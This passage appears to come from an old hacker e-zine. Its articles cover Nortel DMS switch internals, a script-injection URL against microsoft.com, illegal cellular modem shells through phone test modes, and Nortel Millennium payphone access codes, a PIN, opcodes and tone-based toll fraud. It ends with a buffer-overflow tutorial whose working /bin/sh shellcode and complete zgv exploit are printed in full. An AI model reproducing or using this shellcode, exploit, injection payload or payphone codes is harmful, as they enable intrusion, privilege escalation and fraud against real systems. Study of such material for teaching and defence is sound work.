equipment itself. Allows calls to be routed from a remote DMS switch to a host.

DMS is divided into 4 areas that each handle special operations:

1) Central Control Complex (CCC) - Controls the functions that are used in the
other 3 areas. The CCC contains 4 units:

-a) Central Processing Unit: Each DMS switch contains 2 CPUs. The CPUs have
access to memory banks where stored programs and network data are located.
Consider the CPUs the "engines" of the switch. They process all incoming data
from outside lines.

-b) Program Store Memory Module: Associated with one CPU to contain the program
instructions needed to run programs on the switch. The second PS contains
duplicate instructions.

-c) Data Store Memory Module: Contains information such as customer information
and office data. The second DS is a duplicate that is used with the second CPU.

-d) Central Message Controller: Controls the messages between the other areas of
the CCC and the Network Message Controller (NMC) in the various Network Modules
or the I/O controller. Both CPUs have access to the CMC.

2) Network (NET) - Network Modules handle the vocal aspect between the
Peripheral Modules and the Central Control Complex (CCC).

3) Peripheral Modules (PM) - Interface between analog trunks, subscriber lines,
and digital carrier spans (DS-1). Responsible for creating dialtones,
sending/receiving signalling, and checking the network.

Before 1984, the following types of PMs existed:

-a) Trunk Module - Changes speech into digital format to be sent through the
line.  The TM also handles MF tones, test circuit announcement trunks, etc.

-b) Digital Carrier Module - gives a digital interface between the DMS switch
and the DS-1 digital carrier. The DS-1 signal consists of 24 voice channels.

-c) Line Module - gives an interface for a maximum of 640 analog lines and
condenses the voice and signaling into two, three, or four DS-30, 32-channel
speech links.

-d) Remote Line Module - same as above, except it controls the DMS switch
remotely.  Can be used up to 150 miles away.

Since 1984, 10 more types were added:

-a) Digital Trunk Controller - Interfaces up to 20 DS-1 lines, then sends the
DS-1 lines to the network.

-b) Line Group Controller - Can interface up to 20 DS-30 lines, and can serve
RSCs, RLCMs, or OPMs.

-c) Line Trunk Controller - has the ability to give interfaces to a maximum of
20 outside ports from DS-30A speech links or DS-1 links to 16 network side DS-30
speech links.

-d) Line Concentrating Module - An expanded version of the LTC, it can serve up
to 640 subscriber lines interfaced with 2-6 DS-30 speech links.

-e) Remote Switching Center - interfaces subscriber lines at a remote location
to a DMS-100 host. The RSC consists of the Line Concentrator Module, Remote
Cluster Controller, Remote Trunking, Remote-off-Remote, and Emergency
Stand-alone.

-f) Remote Line Concentrating Module - an LCM used from a remote location from
the DMS-100 host. Can handle up to 640 lines, sometimes used as replacement for
PBXs.

-g) Outside Plant Module - Outside plant remote unit. Handles 640 lines over 6
DS-1 Links.

-h) Subscriber Carrier Module - Remote interface for remote concentrators.

-i) SCM-100R - Can interface up to five DMS-1R Terminals. Each terminal can
handle up to 256 lines.

-j) SCM-100U - Can interface up to three DMS-1 Urban RTs. Each RT can interface
up to 576 POTS or special service lines.

4) Maintenance and Adminstration - DMS provides different ways to maintain and
administrate the network. M&A is divided into 4 major groups:

-a) Administrative: Provides for the interrogation, collection and modification
of data.

-b) Internal Maintenance: Includes all DMS hardware (to the MDF) and software.

-c) External Maintenance: Includes circuits on the transmission facility.

-d) Reporting: Include I/O facilities and the alarm system.

Common Channel Interoffice Signalling (CCIS) uses a dedicated line to transmit
data between offices, trunks, or trunk groups. CCIS-6 uses the International
Consultative Committee on Telephone and Telegraph (CCITT) No. 6 international
standard. CCIS-7 added the ability to use CCIS with almost all common DMS
versions such as DMS-100, -200, -100/200, and -100/200 with TOPS. CCIS-6 uses 2
types of Serving Offices (SO):

1) CCIS-BS: used for trunk signalling between COs. Transmits data such as
numbers dialed, number dialed from, and other routing information. CCIS-BS put
an end to Blue Boxing.

2) CCIS-DS: enables the use of touch-tone menu administration, such as voice
mail, calling card input, and so forth.

Access Tandems:

1) Equal Access (EA) gives a connection between Local Access and Transport Areas
(LATA).  It provides such services as ANI, Automatic Message Accounting (AMA)
for both originating and terminating calls, and operator service signaling.

2) Equal Office End Office (EAEO) gives a connection between interLATA carriers
and international carriers' POP.

3)Access Tandem with Equal Access End Office gives a connection from a trunk
tandem to ICs/INCs POP inside a LATA. It uses a two-stage "overlap output
pulsing" method which makes dialing quicker and easier. The first stage
identifies the INC dialed and picks a reliable outgoing trunk. A connection is
established from the INC to the EAEO through the access tandem. The second stage
processes ANI and makes a connection to the called number through your specific
DMS switch type.

4) Access Tandem with a Non-Equal End Office uses Feature Group A, B, or C to
connect to an IC/INC. It uses standard Central Automatic Message Accounting
(CAMA) to place a call through an AT.

Other services provided with DMS switches used in urban areas:

1) Auxiliary Operator Services System (AOSS) - used primarily for directory
assistance, and the intercept needs not included with TOPS.

2) Integrated Business Network (IBN) - commercial concept designed for business
to have a small, private PBX. IBN can be installed into a business to a Centrex
Control Office or a Centrex Costumer Unit with minor hardware adjustments.
Features of IBN include the ability to handle 30,000 lines, customer call
records, centralized attendant maintenance, administration functions, and direct
inward dialing.

3) Electronic Switched Network (ESN) - designed to meet needs of multi- location
complexes. Used with SL-1 or -100 Digital Business Communications Systems with
networking features or a DMS-100 IBN host.

4) Specialized Common Carrier Service (SCCS) - provides conversion of analog and
digital signals. Must be used with older analog lines, sometimes also used with
newer digital lines.

DMS-MTX is a DMS switch used for switching radio and cellular signals. DMS
switches provide 3 basic types of cell switching:

1) Stand-alone switching is used by a MTX which is interfaced with one or more
C5 EOs with DID trunks. MTX is used with urban areas, MTXC for suburban areas,
and MTXM for rural areas.

2) Combined switching is the most cost-effective type of MTX and is easy to
install. It can be incorporated into a DMS-100 switch and used with cellular
software.

3) Remote switching is accomplished by the Remote Switching Center (RSC)
alongside a Cell Site Controller (CSC). A Remote or Stand-alone switch hosts the
remote switch. Remote switching is not used in urban areas.

=================[Cross Site Scripting the Security Gap]=================
=================[           by Tamer Sahin            ]=================



I wonder if Microsoft applies the patches on their systems of their products.
This question is always on my mind. I personally think that sufficient effort is
not made on this topic,and with a little amount of investigation about it,i've
found out that a very simple security threat is still standing at the
microsoft.com web site.This problem ,of course,does not have a direct harm on
the server,but may turn out to be annoying if used indirectly.Yes,the name of
this security gap is ""Cross Site Scripting" .This security gap ,which was
discovered by Georgi Guninski, looks like it might cause some problems in banks
and some places where online shopping is done.

Can Be Done About It ? I want to talk a little bit about "Cross Site Scripting".
This security gap was announced in the preceding months.By means of it ,many
commands can be run on the user's browsers via the intented sites; with the help
of some scripts ,some processes such as reading files from their discs, or even
diverting them to other sites can be held out. These kind of security threats
are big deal for financial settings or for the institutes which provide shopping
via net ( In one of the commercials of a bank in Turkey, people sit in a car
,lock the doors ,and with a spontaneous fantasy ,show their id cards to the ones
who have come out to do banking processes ,to verify the reliability of the site
. However ,there is this problem in a large amount of sites,but what surprised
me was to find out that you can see this security gap in microsoft ,too ,which
has delivered a patch for this problem.

Practice Any asp operating on the site (could be a search engine or could as
well be null.htw kind of script ) can be run making an addition to the &lt;script>
figure. I am going to tell how it is run with a minimum code, now. It is not
difficult at all to write more specific scripts , a little amount of imagination
could be much more annoying then it is thought,as a security gap. Yes,as i have
mentioned before,it is not that big deal to alter the properties of this script
,that's only a minimum instance. Now the hack theories...

Theory? The problem that arised in microsoft ,is the null.htw file which is
saved on the server.The majority of us (?) delete .htw .idq etc ending scripts
,or arrange their permissions so that we permit their usage. It looks like the
Microsoft didnt feel a necessity such that . Writing an url as below,we can run
the "Cross Site Scripting" security gap ,with the help of null.htw:

http://www.microsoft.com/null.htw?CiWebHitsFile=/default.asp&CiRestriction=
"&lt;SCRIPT>alert('Helloo!!');&lt;/SCRIPT>"



The Solution You can find a code below ,which can be used for the "Cross Site
Scripting" attacks on forms etc.With means of this code ,the transfer of the
large sized script blocks with the "onsubmit" method will be prevented and
warning signals will be sent for the figures such as "% < > [ ] { } ; & + - " '
( )" not executing them .

&lt;PRE class=CodeForeground>function checkForm() {
document.forms[0].userName.value = _
RemoveBad(document.forms[0].userName.value); return true; } // Bad Characters
function RemoveBad(strTemp) { strTemp =
strTemp.replace(/\&lt;|\&gt;|\"|\'|\%|\;|\(|\)|\&amp;|\+|\-/g, ""); return
strTemp; } &lt;/PRE>

=============[Shell/PPP Connectivity over Cellular Networks]=============
=============[                   by engel                  ]=============




This hasn't been fully tested (I've only tested the shell portion). It's up to
you to try out the PPP connection. In theory, it should work, but it's going to
be really slow.) And be forewarned, this is illegal. Everything you do based on
this is your choice, not mine. I am only supplying information, and I am not
responsible for your actions. If the FCC comes a knocking, don't be bitching to
me or LoU about your legal engagements. It is your fault if you get caught doing
any of the below in practice. Not mine.

The idea came to me a few months ago when I was in my friend's car, wishing that
I could nab a few files off my system when we were on the road. It completely
dawned on me a few minutes later when I was playing with my Motorola 2800
bagphone. I had to find a way to make a network connection to my main server
back at my (old) house. And I figured cellular communication was the way to go.

I went home later that day, and dug around my box full of (mostly) various
electronics and phone equipment. I found an old US Robotics 28.8 ext. modem,
RJ-11 -> Motorola TeleTAC adapter (For modems, duh.) and my old acoustic
coupler. I threw the external modem on my server, then ran some RJ11 to the
adapter, and connected the adapter to the TeleTAC. Whee.

Now, client side, I popped the coupler onto the 2800, then connected it to my
amazing 14.4 on the lappy. Now how the fuck did I establish the god damn
connection? This is going to be a bit lengthy, so let's list it out.

1) I edited my inittab (/etc/inittab) and added a dialup term. (You can find
it.)

2) Popped both cellphones into testmode. Nothing like FCN-00-**-83786633-STO.
Then I popped them onto an unused channel. And then (gasp) put them into Rx/Tx
mode by doing the following.  a) 08# b) 10# c) 05# d) 353#

Oh my. I think we can hear ourselves talk over the channel. Isn't that special?

3) On the external modem, I threw a switch on it that said 'Auto Answer'. Now, I
realize this isn't on all Externals, and I should recommend that you find one,
wheter it's at a Goodwill, or a vintage computer store.

4) Started minicom on the laptop. And typed in the magical string, ATD.

Boom. That's all it took. I got an amazing 19.2 connection over the cellular
link. Now, could you get a higher connection with faster modems? No, dumb ass.
You can probably get a 28.8 connection, but it will most likely time out.

Now, unless you have some really old towers around your area that actually
forward channels through different towers (i.e. You're driving down the road,
and you're out of the original tower's range, then you switch over.) you're
going to get disconnected if you pass the limited range of your tower, which is
anywhere between 6 to 10 miles. There is only a couple ways around that, but I'm
sure you can figure them out within a few hours, minutes, or seconds from now.

Okay, so you have yourself a cellular shell. Whoop dee doo. Now if you can
actually make a networked connection over the link, that would be nice, eh?
Well, using the wonderful PPP protocol, we can!

Add a new user on your host, name it whatever the fuck you want. Now, for the
shell, make sure it's /usr/sbin/pppd. Make a new file in your favorite editor
called .ppprc and put it in the user's $home. Put the following in it.


connect -detach modem crtscts lock :192.168.100.4

Whoop, there it is. Now on the client side, make a ppp script that logs in as
that user. And that's all she wrote. It should work, but I make no guarantees
whatsoever, since I never tested it.

So play around with it, if you dare. Mail me some followups, additions, and so
on also, I'd like to hear some new ideas to add to this simple project. Next
time, I'll get in depth with more wireless networking projects for your geeky
enjoyment.

=====================[ Nortel Millennium Payphones ]=====================
=====================[          by ^CircuiT^       ]=====================




Well for you people out there that don't know what a millennium pay phone looks
like, I'll start out by telling you. There are many different types of
millennium payphones and none of them look the same, so instead of siting here
and trying to describe them all I have a few pictures with this file. The most
common Millennium payphone is the M1231 and since it is the most common that is
the one I will talk about most in this file. For the rest of them look at the
end of this file. The M1231 is black with a silver front and a two line LED
screen that can be reprogrammed to say other things, such as "Mr. T was here"
but ill be getting into the reprogramming of that a bit later. Under the LED
screen there are four buttons the first two control the volume. The next one
controls the languages, for example English to Spanish or English to French. For
you people in Canada and the last button hangs up your in order to make another
call. At the top of the phone it's blue and at the bottom there is a yellow card
reader for smart cards, credit cards, and other calling cards such as MCI
calling cards. Just above the yellow card reader there are five more buttons
that the owner/local phone company can program to do what ever they want. There
are two different versions of the M1231 ver1.0 does not have a RJ-11 jack but
the ver2.0 does. The RJ-11 jack is there so you can plug your laptop into the
phone and connect to the Internet. (The M1231 ver2.0 is mostly in airports)

Well know that you know what they look like let's get into the security of the
pay phone. It has four keyholes as you might have seen by just looking at it.
The two keyholes on the top and left-hand side of the phone are for changing the
LED screen. There is another keyhole under neather the yellow card reader that
is for changing the coin box and on the side of the coin box there is yet
another keyhole, you need both keys to open the coin box. You will also need an
access code (or pin) to get to the coin box (this is not yet confirmed). Another
little bit of security the phone has is an alarm some are silent and some are a
loud beep. When the alarm is set off the phone calls a set number and notifies
them that there is a problem. There are some security rumors flying around, such
as there is a tracking device in the phone and that if a phone stolen and then
hook-up to a new phone line it will automatically call a set number.

Ok, now that you know about the phones security and how to open it, lets get
into the internal hardware workings of the phone. Unlike other payphones the
Nortel Millennium payphone has a built in computer and modem the computer is
called the "Millennium Manager" and it keeps a log of every call made form the
phone including (800, 888, 877, 911, 611, 411, 311, and 0). It also keep track
of how the person paid for the call ( collect, card, cash), and also keeps tabs
on how many coins are in the coin box and if anything else goes wrong in the
phone such as the card reader or LED screen it calls a set number and tells
them, and a log of every time the phone is opened or the coin box is opened or
if someone changes the display screen. A tool called the "Millennium Maximizer"
accesses all this but not much is yet known about this. So as I get that
information I will release it. On to the yellow card reader. Once you have
opened the phone you should be able to remove the yellow card reader with
stander tools such as a screwdriver...etc. Once you have the yellow card reader
you should be able to hook it up to your home computer and read cards with it
but with what software I don't know. Some people say that you can modify cards
with it as well but I have seen nothing that would indicate that. Ok now that
all that stuff is out of the way lets talk about that little two line LED sign.
To change the display this is what you must do first: You will need two keys one
for the top and the one for the left-hand side. After unlocking them you will
have to enter an access code (or pin) from the keypad. (If you don't enter the
pin an alarm will sound.) Then you can remove the top part of the phone in side
you will find a port that you can plug in a Millennium Maxmizer.

Ok people, we've made this far so let get straight into the software aspect of
the phone starting off with the Millennium Manager. The Millennium Manager is
the program the phone's computer runs, it keep track of everything as I said
above and that's all I know at this point about the manager. Now onto the
Opcodes. Opcodes are short strings of number that are pre-set functions on
Millennium payphones but you must correctly enter a pin before you have the
chance to input an Opcode. I have heard from other people that you can dial
2541965 or yet another code that is CRASERV or in numbers 2727378 with the hook
down. After you dialed it you should be asked for an access code (or pin). One
known pin is 25563. After you entered the PIN you could enter any Opcode. Here
are a list of opcodes:  267# Answer detect 274# Display brightness control
(down?) 277# Display brightness control (up?) 349# Unknown 636# memory access
688# Unknown 66666# motor sound prompts to open phone - probably coin removal
996# error has occurred. (Please note these codes are what people have told me I
have not getten them to work.) Some other software aspects of the phone is the
fake dial tone, its only a recording. You would know this if you ever picked one
up cause you hear the fake dial tone and some op telling you to "insert your
card". So what happens is you dial the number your calling put your money in and
the computer dials it so you never get the chance to hear a real dial tone. You
might be asking yourself if I don't ever hear a real dial tone can I box a call
off a millennium phone. The answer is yes and no. Yes you can box local calls, I
do it all the time just hit 0 for the op and tell her the phone's keypad is
messed up and ask her to dial for you then drop in your tones. The No is for
boxing long distances calls, the Op's don't really like it when you put in $3.50
in fake coins.

One of the most fun things I have found about the millennium phone is that you
can use it as a DTMF decoder. It's really simple to all you do is take you
recorded DTMF tone to the phone and play them really loud into the month piece
of the phone the numbers will show up on the LCD screen and there you go, you
got a DTMF decoder.

Well we have covered a hole lot about the millennium payphone but theres still a
little bit to cover like the fact that millennium phones have a ringer but never
ring. The reason for this is because if you call a millennium phone you will one
of about four different msg saying things like " this line is for out going
calls only " or " the number *** - **** is out of serves ". The reason Nortel
did this was because they didn't want drug dealers hanging out by the phone
waiting for a call. If you act like a really nice person you can call the op and
ask her to call you back on it "but wait a min you said they cant get incoming
calls". Well they can but only from an op see when you call her this pop's up on
her screen 0 (+) MIL_UNIV or 0 (+) MIL_CARD plus your location so she thinks why
call them back? But if you convince her who knows you might of made that phone
ring for the first time ever.

Ok now that we are done with everything lets talk about all the other millennium
phones. Well since I haven't used any of these phone yet, so I don't have much
to talk about so I put in here what Nortell has to say about there phone from
there web page and if your reading this out of the zip you got pictures with
this file. Enjoy.

The M1000 Public communications access terminals need to be ready for the future
-- even if they accept only coins today. The Millennium M1000 Coin Basic

==================[Writing Buffer Overflow Exploits]=====================
==================[            by mixter           ]=====================

 

Buffer overflows in user input dependent buffers have become one of the biggest
security hazards on the internet and to modern computing in general. This is
because such an error can easily be made at programming level, and while
invisible for the user who does not understand or cannot acquire the source
code, many of those errors are easy to exploit. This paper makes an attempt to
teach the novice - average C programmer how an overflow condition can be proven
to be exploitable.

Mixter

1. Memory

Note: The way I describe it here, memory for a process is organized on most
computers, however it depends on the type of processor architecture. This
example is for x86 and also roughly applies to sparc.

The principle of exploiting a buffer overflow is to overwrite parts of memory
which aren't supposed to be overwritten by arbitrary input and making the
process execute this code. To see how and where an overflow takes place, lets
take a look at how memory is organized. A page is a part of memory that uses its
own relative addressing, meaning the kernel allocates initial memory for the
process, which it can then access without having to know where the memory is
physically located in RAM. The processes memory consists of three sections:

- code segment, data in this segment are assembler instructions that the
processor executes. The code execution is non-linear, it can skip code, jump,
and call functions on certain conditions. Therefore, we have a pointer called
EIP, or instruction pointer. The address where EIP points to always contains the
code that will be executed next.

- data segment, space for variables and dynamic buffers

- stack segment, which is used to pass data (arguments) to functions and as a
space for variables of functions. The bottom (start) of the stack usually
resides at the very end of the virtual memory of a page, and grows down. The
assembler command PUSHL will add to the top of the stack, and POPL will remove
one item from the top of the stack and put it in a register. For accessing the
stack memory directly, there is the stack pointer ESP that points at the top
(lowest memory address) of the stack.

2. Functions

A function is a piece of code in the code segment, that is called, performs a
task, and then returns to the previous thread of execution. Optionally,
arguments can be passed to a function. In assembler, it usually looks like this
(very simple example, just to get the idea):

memory address code 0x8054321 &lt;main+x> pushl $0x0 0x8054322 call $0x80543a0
&lt;function> 0x8054327 ret 0x8054328 leave
... 
0x80543a0 &lt;function> popl %eax 0x80543a1 addl $0x1337,%eax 0x80543a4 ret

What happens here? The main function calls function(0); The variable is 0, main
pushes it onto the stack, and calls the function. The function gets the variable
from the stack using popl. After finishing, it returns to 0x8054327. Commonly,
the main function would always push register EBP on the stack, which the
function stores, and restores after finishing. This is the frame pointer
concept, that allows the function to use own offsets for addressing, which is
mostly uninteresting while dealing with exploits, because the function will not
return to the original execution thread anyways. :-) We just have to know what
the stack looks like. At the top, we have the internal buffers and variables of
the function. After this, there is the saved EBP register (32 bit, which is 4
bytes), and then the return address, which is again 4 bytes. Further down, there
are the arguments passed to the function, which are uninteresting to us. In this
case, our return address is 0x8054327. It is automatically stored on the stack
when the function is called. This return address can be overwritten, and changed
to point to any point in memory, if there is an overflow somewhere in the code.

3. Example of an exploitable program

Lets assume that we exploit a function like this:

void lame (void) { char small[30]; gets (small); printf("%s\n", small); } main()
{ lame (); return 0; }

Compile and disassemble it:  # cc -ggdb blah.c -o blah /tmp/cca017401.o: In
function `lame':  /root/blah.c:1: the `gets' function is dangerous and should
not be used.  # gdb blah /* short explanation: gdb, the GNU debugger is used
here to read the binary file and disassemble it (translate bytes to assembler
code) */ (gdb) disas main Dump of assembler code for function main:  0x80484c8
&lt;main>: pushl %ebp 0x80484c9 &lt;main+1>: movl %esp,%ebp 0x80484cb &lt;main+3>: call
0x80484a0 &lt;lame> 0x80484d0 &lt;main+8>: leave 0x80484d1&lt;main+9>: ret

(gdb) disas lame Dump of assembler code for function lame:  /* saving the frame
pointer onto the stack right before the ret address */ 0x80484a0 &lt;lame>: pushl
%ebp 0x80484a1 &lt;lame+1>: movl %esp,%ebp /* enlarge the stack by 0x20 or 32. our
buffer is 30 characters, but the memory is allocated 4byte-wise (because the
processor uses 32bit words) this is the equivalent to: char small[30]; */
0x80484a3 &lt;lame+3>: subl $0x20,%esp /* load a pointer to small[30] (the space on
the stack, which is located at virtual address 0xffffffe0(%ebp)) on the stack,
and call the gets function: gets(small); */ 0x80484a6 &lt;lame+6>: leal
0xffffffe0(%ebp),%eax 0x80484a9 &lt;lame+9>: pushl %eax 0x80484aa &lt;lame+10>: call
0x80483ec &lt;gets> 0x80484af &lt;lame+15>: addl $0x4,%esp /* load the address of
small and the address of "%s\n" string on stack and call the print function:
printf("%s\n", small); */ 0x80484b2 &lt;lame+18>: leal 0xffffffe0(%ebp),%eax
0x80484b5 &lt;lame+21>: pushl %eax 0x80484b6 &lt;lame+22>: pushl $0x804852c 0x80484bb
&lt;lame+27>: call 0x80483dc &lt;printf> 0x80484c0 &lt;lame+32>: addl $0x8,%esp /* get
the return address, 0x80484d0, from stack and return to that address. you don't
see that explicitly here because it is done by the CPU as 'ret' */ 0x80484c3 :
leave 0x80484c4 : ret End of assembler dump.

3a. Overflowing the program # ./blah xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx # ./blah xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Segmentation fault (core dumped) # gdb blah
core (gdb) info registers eax: 0x24 36 ecx: 0x804852f 134513967 edx: 0x1 1 ebx:
0x11a3c8 1156040 esp: 0xbffffdb8 -1073742408 ebp: 0x787878 7895160

EBP is 0x787878, this means that we have written more data on the stack than the
input buffer could handle. 0x78 is the hex representation of 'x'. The process
had a buffer of 32 bytes maximum size. We have written more data into memory
than allocated for user input and therefore overwritten EBP and the return
address with 'xxxx', and the process tried to resume execution at address
0x787878, which caused it to get a segmentation fault.

3b. Changing the return address

Lets try to exploit the program to return to lame() instead of return. We have
to change return address 0x80484d0 to 0x80484cb, that is all. In memory, we
have: 32 bytes buffer space | 4 bytes saved EBP | 4 bytes RET Here is a simple
program to put the 4byte return address into a 1byte character buffer:  main() {
int i=0; char buf[44]; for (i=0;i<=40;i+=4) *(long *) &buf[i] = 0x80484cb;
puts(buf); } # ret ╦╦╦╦╦╦╦╦╦╦╦,

# (ret;cat)|./blah test ╦╦╦╦╦╦╦╦╦╦╦,test test test

Here we are, the program went through the function two times. If an overflow is
present, the return address of functions can be changed to alter the programs
execution thread.

4. Shellcode

To keep it simple, shellcode is simply assembler commands, which we write on the
stack and then change the retun address to return to the stack. Using this
method, we can insert code into a vulnerable process and then execute it right
on the stack. So, lets generate insertable assembler code to run a shell. A
common system call is execve(), which loads and runs any binary, terminating
execution of the current process. The manpage gives us the usage: int execve
(const char *filename, char *const argv [], char *const envp[]); Lets get the
details of the system call from glibc2:  # gdb /lib/libc.so.6 (gdb) disas execve
Dump of assembler code for function execve:  0x5da00 &lt;execve&lgt;: pushl %ebx


/* this is the actual syscall. before a program would call execve, it would push
the arguments in reverse order on the stack: **envp, **argv, *filename */ /* put
address of **envp into edx register */ 0x5da01 &lt;execve+1>: movl
0x10(%esp,1),%edx /* put address of **argv into ecx register */ 0x5da05
&lt;execve+5>: movl 0xc(%esp,1),%ecx /* put address of *filename into ebx register
*/ 0x5da09 &lt;execve+9>: movl 0x8(%esp,1),%ebx /* put 0xb in eax register; 0xb ==
execve in the internal system call table */ 0x5da0d &lt;execve+13>: movl $0xb,%eax
/* give control to kernel, to execute execve instruction */ 0x5da12 &lt;execve+18>:
int $0x80

0x5da14 &lt;execve+20>: popl %ebx 0x5da15 &lt;execve+21>: cmpl $0xfffff001,%eax
0x5da1a &lt;execve+26>: jae 0x5da1d <__syscall_error> 0x5da1c &lt;execve+28>: ret End
of assembler dump.

4a. making the code portable

We have to apply a trick to be able to make shellcode without having to
reference the arguments in memory the conventional way, by giving their exact
address on the memory page, which can only be done at compile time. Once we can
estimate the size of the shellcode, we can use the instructions jmp &lt;bytes> and
call &lt;bytes> to go a specified number of bytes back or forth in the execution
thread. Why use a call? We have the opportunity that a CALL will automatically
store the return address on the stack, the return address being the next 4 bytes
after the CALL instruction. By placing a variable right behind the call, we
indirectly push its address on the stack without having to know it.


0 jmp &lt;Z> (skip Z bytes forward) 2 popl %esi
... put function(s) here ... 
Z call <-Z+2> (skip 2 less than Z bytes backward, to POPL) Z+5 .string (first
variable)

(Note: If you're going to write code more complex than for spawning a simple
shell, you can put more than one .string behind the code. You know the size of
those strings and can therefore calculate their relative locations once you know
where the first string is located.)

4b. the shellcode


global code_start /* we'll need this later, dont mind it */ global code_end
.data 
code_start:  jmp 0x17 popl %esi movl %esi,0x8(%esi) /* put address of **argv
behind shellcode,

0x8 bytes behind it so a /bin/sh has place */ xorl %eax,%eax /* put 0 in %eax */
movb %eax,0x7(%esi) /* put terminating 0 after /bin/sh string */ movl
%eax,0xc(%esi) /* another 0 to get the size of a long word */ my_execve:  movb
$0xb,%al /* execve( */ movl %esi,%ebx /* "/bin/sh", */ leal 0x8(%esi),%ecx /* &

.string "/bin/shX" /* X is overwritten by movb %eax,0x7(%esi) */ 
code_end:

(The relative offsets 0x17 and -0x1c can be gained by putting in 0x0, compiling,
disassembling and then looking at the shell codes size.)

This is already working shellcode, though very minimal. You should at least
disassemble the exit() syscall and attach it (before the 'call'). The real art
of making shellcode also consists of avoiding any binary zeroes in the code
(indicates end of input/buffer very often) and modify it for example, so the
binary code does not contain control or lower characters, which would get
filtered out by some vulnerable programs. Most of this stuff is done by
self-modifying code, like we had in the movb %eax,0x7(%esi) instruction. We
replaced the X with \0, but without having a \0 in the shellcode initially...

Lets test this code... save the above code as code.S (remove comments) and the
following file as code.c:  extern void code_start(); extern void code_end();
#include &lt;stdio.h> main() { ((void (*)(void)) code_start)(); }

# cc -o code code.S code.c # ./code bash#

You can now convert the shellcode to a hex char buffer. Best way to do this is,
print it out:  #include &lt;stdio.h> extern void code_start(); extern void
code_end(); main() { fprintf(stderr,"%s",code_start); }

and parse it through aconv -h or bin2c.pl, those tools can be found at:
http://www.dec.net/~dhg or http://members.tripod.com/mixtersecurity

5. Writing an exploit

Let us take a look at how to change the return address to point to shellcode put
on the stack, and write a sample exploit. We will take zgv, because that is one
of the easiest things to exploit out there :)


# export HOME=`perl -e 'printf "a" x 2000'` # zgv Segmentation fault (core
dumped) # gdb /usr/bin/zgv core #0 0x61616161 in ?? () (gdb) info register esp
esp: 0xbffff574 -1073744524

Well, this is the top of the stack at crash time. It is safe to presume that we
can use this as return address to our shellcode.

We will now add some NOP (no operation) instructions before our buffer, so we
don't have to be 100% correct regarding the prediction of the exact start of our
shellcode in memory (or even brute forcing it). The function will return onto
the stack somewhere before our shellcode, work its way through the NOPs to the
inital JMP command, jump to the CALL, jump back to the popl, and run our code on
the stack.

Remember, the stack looks like this: at the lowest memory address, the top of
the stack where ESP points to, the initial variables are stored, namely the
buffer in zgv that stores the HOME environment variable. After that, we have the
saved EBP(4bytes) and the return address of the previous function. We must write
8 bytes or more behind the buffer to overwrite the return address with our new
address on the stack.

The buffer in zgv is 1024 bytes big. You can find that out by glancing at the
code, or by searching for the initial subl $0x400,%esp (=1024) in the vulnerable
function. We will now put all those parts together in the exploit:

5a. Sample zgv exploit

/* zgv v3.0 exploit by Mixter buffer overflow tutorial - http://1337.tsx.org

sample exploit, works for example with precompiled redhat 5.x/suse 5.x/redhat
6.x/slackware 3.x linux binaries */

#include &lt;stdio.h> #include &lt;unistd.h> #include &lt;stdlib.h>

/* This is the minimal shellcode from the tutorial */ static char shellcode[]=
"\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"
"\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";

#define NOP 0x90 #define LEN 1032 #define RET 0xbffff574

int main() { char buffer[LEN]; long retaddr = RET; int i;

fprintf(stderr,"using address 0x%lx\n",retaddr);

/* this fills the whole buffer with the return address, see 3b) */ for
(i=0;i&lt;LEN;i+=4) *(long *)&buffer[i] = retaddr;

/* this fills the initial buffer with NOP's, 100 chars less than the buffer
size, so the shellcode and return address fits in comfortably */ for
(i=0;i<(LEN-strlen(shellcode)-100);i++) *(buffer+i) = NOP;

/* after the end of the NOPs, we copy in the execve() shellcode */
memcpy(buffer+i,shellcode,strlen(shellcode));

/* export the variable, run zgv */

setenv("HOME", buffer, 1); execlp("zgv","zgv",NULL); return 0; }

/* EOF */

We now have a string looking like this:

[ ... NOP NOP NOP NOP NOP JMP SHELLCODE CALL /bin/sh RET RET RET RET RET RET ]

While zgv's stack looks like this:

v-- 0xbffff574 is here [ S M A L L B U F F E R ] [SAVED EBP] [ORIGINAL RET]

The execution thread of zgv is now as follows:

main ... -> function() -> strcpy(smallbuffer,getenv("HOME")); At this point, zgv
fails to do bounds checking, writes beyond smallbuffer, and the return address
to main is overwritten with the return address on the stack. function() does
leave/ret and the EIP points onto the stack:  0xbffff574 nop 0xbffff575 nop
0xbffff576 nop 0xbffff577 jmp $0x24 0xbffff579 popl %esi [... shellcode starts
here ...] 0xbffff59b call -$0x1c 0xbffff59e .string "/bin/shX"

Lets test the exploit...  # cc -o zgx zgx.c # ./zgx using address 0xbffff574
bash# 5b. further tips on writing exploits There are a lot of programs which are
tough to exploit, but nonetheless vulnerable. However, there are a lot of tricks
you can do to get behind filtering and such. There are also other overflow
techniques which do not necessarily include changing the return address at all
or only the return address. There are so-called pointer overflows, where a
pointer that a function allocates can be overwritten by an overflow, altering
the programs execution flow (an example is the RoTShB bind 4.9 exploit), and
exploits where the return address points to the shells environment pointer,
where the shellcode is located instead of being on the stack (this defeats very
small buffers, and Non-executable stack patches, and can fool some security
programs, though it can only be performed locally). Another important subject
for the skilled shellcode author is radically self-modifying code, which
initially only consists of printable, non-white upper case characters, and then
modifies itself to put functional shellcode on the stack which it executes, etc.
You should never, ever have any binary zeroes in your shell code, because it
will most possibly not work if it contains any. But discussing how to sublimate
certain assembler commands with others would go beyond the scope of this paper.
I also suggest reading the other great overflow howto's out there, written by
aleph1, Taeoh Oh and mudge.

5c. important note

You will NOT be able to use this tutorial on Windows or Macintosh. Do NOT ask me
for cc.exe and gdb.exe either! =oP

6. Conclusions

We have learned, that once an overflow is present which is user dependent, it
can be exploited about 90% of the time, even though exploiting some situations
is difficult and takes some skill. Why is it important to write exploits?
Because ignorance is omniscient in the software industry. There have already
been reports of vulnerabilities due to buffer overflows in software, though the
software has not been updated, or the majority of users didn't update, because
the vulnerability was hard to exploit and nobody believed it created a security
risk. Then, an exploit actually comes out, proves and practically enables a
program to be exploitable, and there is usually a big (neccessary) hurry to
update it.

As for the programmer (you), it is a hard task to write secure programs, but it
